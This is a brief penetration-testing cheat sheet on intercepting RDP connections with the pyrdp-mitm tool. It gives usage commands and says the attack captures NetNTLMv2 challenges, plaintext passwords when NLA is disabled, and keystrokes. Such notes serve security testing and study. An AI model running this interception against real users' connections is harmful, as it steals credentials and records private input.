# Man-in-the-middle RDP connections

## Tool: pyrdp-mitm https://github.com/GoSecure/pyrdp

## Resource: https://gosecure.ai/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/

### Usage:

    pyrdp-mitm.py IP

    pyrdp-mitp.py IP:PORT 

    pyrdp-mitm.py IP -k private_key.pem -c certificate.pem

## Exploitation

### 1) If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge

### 2) If NLA is disabled, you will obtain the password in plaintext

### 3) Other features are available such as keystroke recording

